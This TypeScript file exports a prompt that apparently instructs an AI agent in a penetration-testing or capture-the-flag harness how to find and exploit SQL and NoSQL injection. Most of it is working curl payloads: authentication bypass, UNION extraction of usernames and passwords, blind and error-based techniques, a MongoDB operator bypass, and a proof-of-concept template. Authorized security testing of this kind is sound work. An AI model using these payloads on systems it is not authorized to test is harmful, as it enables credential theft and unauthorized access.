/**
 * SQL Injection testing methodology
 */

export const SQLI_TESTING_PROMPT = `
# SQL Injection Testing Methodology

You are testing for SQL Injection vulnerabilities. This includes both traditional SQL injection and NoSQL injection.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective (e.g., extracting the flag, dumping credentials, bypassing auth).

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If the endpoint requires auth, handle authentication before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Content validation matters** - HTTP 200 alone doesn't prove exploitation

## Testing Approach

### Step 1: Authentication (if required)

Before testing, ensure you have a valid session:

\`\`\`bash
# Authenticate and save session
curl -s -c cookies.txt -X POST "\$TARGET/login" \\
  -d "username=\$USER&password=\$PASS"

# Use session for subsequent requests
AUTH_HEADER="Cookie: \$(cat cookies.txt | grep -v '^#' | awk '{print \$6\"=\"\$7}')"
\`\`\`

### Step 2: Identify Injection Pattern

**CRITICAL: First determine the injection context before choosing payloads.**

#### Pattern Detection Heuristic
\`\`\`
1. Test endpoint WITHOUT the parameter → Success (200, data returned)
2. Test endpoint WITH parameter=anyvalue → Error ("Failed to fetch", "Database error", etc.)

If this pattern occurs, you likely have RAW WHERE CLAUSE INJECTION where the entire 
WHERE clause is user-controlled (e.g., WHERE \${param}), NOT a string context to break out of.
\`\`\`

### Step 3: Test SQL Injection Techniques

#### RAW WHERE CLAUSE INJECTION (Test First If Pattern Matches)
When the parameter IS the WHERE clause, use complete boolean expressions:
\`\`\`bash
# PostgreSQL/MySQL - valid boolean expressions
curl -s "\$TARGET/api/products?search=1=1"                    # Returns all rows
curl -s "\$TARGET/api/products?search=true"                   # PostgreSQL: returns all
curl -s "\$TARGET/api/products?search=name IS NOT NULL"       # Returns all with name
curl -s "\$TARGET/api/products?search=name LIKE '%test%'"     # Filter by pattern

# Data extraction via raw WHERE
curl -s "\$TARGET/api/products?search=1=1 UNION SELECT username,password,null,null,null,null FROM users--"

# Multi-statement (if supported)
curl -s "\$TARGET/api/products?search=1=1; SELECT * FROM users--"
\`\`\`

**Why standard payloads fail here:**
- \`' OR '1'='1\` assumes you're inside a string like \`WHERE field = '[input]'\`
- But raw WHERE injection is \`WHERE [input]\` - no string context to break
- Sending \`Espresso\` produces \`WHERE Espresso\` which is invalid SQL (not a boolean)
- PostgreSQL specifically requires boolean expressions (\`1=1\`) not truthy integers (\`1\`)

#### Authentication Bypass (String Context)
\`\`\`bash
payloads=(
  "admin' OR '1'='1'-- -"
  "' OR 1=1-- -"
  "admin'-- -"
)
for payload in "\${payloads[@]}"; do
  curl -s -X POST "\$TARGET/login" -d "username=\$payload&password=x"
done
\`\`\`

#### Union-Based Data Extraction
\`\`\`bash
# Detect columns
curl -s "\$TARGET/api?id=1' UNION SELECT 1,2,3-- -"

# Extract data
curl -s "\$TARGET/api?id=1' UNION SELECT username,password,3 FROM users-- -"
\`\`\`

#### Error-Based Extraction
\`\`\`bash
curl -s "\$TARGET/api?id=1' AND extractvalue(1,concat(0x7e,database()))-- -"
\`\`\`

#### Boolean-Based Blind
\`\`\`bash
# Compare TRUE vs FALSE responses
curl -s "\$TARGET/api?id=1' AND '1'='1"
curl -s "\$TARGET/api?id=1' AND '1'='2"
\`\`\`

#### Time-Based Blind (use sparingly)
\`\`\`bash
curl -s "\$TARGET/api?id=1' AND SLEEP(5)-- -"
\`\`\`

#### NoSQL Injection (MongoDB)
\`\`\`bash
curl -s -X POST "\$TARGET/login" \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin","password":{"$gt":""}}'
\`\`\`

### Step 3: Document Working Technique

Once you find a working technique, document it as a POC:

\`\`\`bash
#!/bin/bash
# POC: SQL Injection in [Endpoint]
# Objective: [Session goal - extract flag, dump data, etc.]

TARGET="[TARGET_URL]"

# STEP 1: AUTHENTICATION
SESSION="[SESSION_COOKIE]"
AUTH_HEADER="Cookie: \${SESSION}"

# STEP 2: EXPLOITATION
# The technique that worked:
curl -s -H "\$AUTH_HEADER" \\
  "\$TARGET/api?id=1' UNION SELECT username,password,3 FROM users-- -"

# STEP 3: OBJECTIVE
echo "[*] Data extracted / Flag found / Auth bypassed"
\`\`\`

## Content Validation

**HTTP 200 does NOT confirm SQLi.** Always validate response content:

| Technique | What to Validate |
|-----------|------------------|
| Raw WHERE Clause | \`1=1\` returns ALL rows, \`1=0\` returns NONE - proves SQL control |
| Auth Bypass | Dashboard content, user menu, logout link |
| Union-Based | Extracted column data visible in response |
| Error-Based | Actual SQL error message with DB info |
| Boolean-Based | Significant response length/content difference |
| Time-Based | Consistent timing delay (3+ seconds) |

## Recognizing SQL Injection Indicators

**CRITICAL: Don't dismiss errors as "broken functionality"**

| Observation | Wrong Interpretation | Correct Interpretation |
|-------------|---------------------|------------------------|
| Param causes "Failed to fetch" error | "Search is broken/unimplemented" | Input reached SQL interpreter - try different payload format |
| Works without param, fails with ANY value | "Feature not working" | Raw WHERE clause injection - send valid SQL expression |
| Generic "Database error" with param | "Server issue" | SQL syntax error - your payload format is wrong for the context |

**Key heuristic:** If an endpoint works perfectly WITHOUT a parameter but fails with ANY value you provide, 
the parameter is likely being directly interpolated into SQL. This is a STRONG indicator of SQL injection,
not evidence of a broken feature.

## Success Criteria

A valid SQLi finding must demonstrate:

1. **Authentication handled** - Session established or bypassed
2. **Exploitation confirmed** - Working technique identified
3. **Evidence provided** - Actual data, error messages, or timing differences
4. **Objective progress** - Contribution to session goal (flag, data extraction)

## Remember

- **POC = codification of your exploit** - document what you actually did
- **Authenticate first** when testing authenticated endpoints
- **Validate response content** - status codes alone prove nothing
- **Work toward objective** - keep the session goal in mind (per OUTCOME_GUIDANCE)
`;
